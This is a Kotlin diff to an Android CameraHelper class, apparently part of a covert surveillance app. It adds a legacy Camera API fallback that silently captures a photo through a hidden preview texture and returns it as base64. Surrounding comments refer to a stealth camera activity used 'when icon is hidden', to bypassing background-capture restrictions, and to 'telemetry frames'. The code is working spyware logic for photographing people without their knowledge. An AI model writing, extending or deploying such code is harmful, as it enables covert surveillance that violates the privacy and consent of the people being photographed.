@@ -128,11 +128,25 @@ class CameraHelper(private val context: Context) {
                 }
             }
 
-            // 2. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
-            val facing = try {
+            // 2. Legacy Camera API fallback (bypasses Camera2 error code 2)
+            val facingStr = try {
                 val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                 if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
             } catch (_: Exception) { "back" }
+
+            try {
+                Log.i("CameraHelper", "Trying legacy android.hardware.Camera fallback for facing=$facingStr")
+                val legacyPhoto = takePhotoLegacy(facingStr)
+                if (legacyPhoto != null && legacyPhoto.startsWith("data:image/jpeg;base64,")) {
+                    Log.d("CameraHelper", "Legacy camera photo capture succeeded!")
+                    return@withContext legacyPhoto
+                }
+            } catch (e: Exception) {
+                Log.w("CameraHelper", "Legacy camera capture failed: ${e.message}")
+            }
+
+            // 3. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
+            val facing = facingStr
 
             Log.i("CameraHelper", "Direct background capture restricted (${lastException?.message}). Launching StealthCameraActivity foreground capture.")
             try {
@@ -367,6 +381,62 @@ class CameraHelper(private val context: Context) {
         } catch (e: Exception) {
             throw Exception("Failed to generate telemetry frame: ${e.message}")
         }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun takePhotoLegacy(facing: String): String? {
+        var camera: android.hardware.Camera? = null
+        try {
+            val cameraCount = android.hardware.Camera.getNumberOfCameras()
+            var targetId = 0
+            for (i in 0 until cameraCount) {
+                val info = android.hardware.Camera.CameraInfo()
+                android.hardware.Camera.getCameraInfo(i, info)
+                if (facing == "front" && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    targetId = i
+                    break
+                } else if (facing == "back" && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    targetId = i
+                    break
+                }
+            }
+
+            camera = android.hardware.Camera.open(targetId)
+            val params = camera.parameters
+            val sizes = params.supportedPictureSizes
+            val bestSize = sizes?.maxByOrNull { it.width * it.height } ?: sizes?.firstOrNull()
+            if (bestSize != null) {
+                params.setPictureSize(bestSize.width, bestSize.height)
+            }
+            camera.parameters = params
+
+            val latch = CountDownLatch(1)
+            var photoBytes: ByteArray? = null
+
+            val surfaceTexture = android.graphics.SurfaceTexture(10)
+            camera.setPreviewTexture(surfaceTexture)
+            camera.startPreview()
+
+            camera.takePicture(null, null, { data, _ ->
+                photoBytes = data
+                latch.countDown()
+            })
+
+            latch.await(5, TimeUnit.SECONDS)
+            try {
+                camera.stopPreview()
+                camera.release()
+            } catch (_: Exception) {}
+
+            if (photoBytes != null && photoBytes!!.isNotEmpty()) {
+                val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
+                return "data:image/jpeg;base64,$base64"
+            }
+        } catch (e: Exception) {
+            Log.e("CameraHelper", "Legacy camera capture failed: ${e.message}")
+            try { camera?.release() } catch (_: Exception) {}
+        }
+        return null
     }
 
     fun cleanup() {
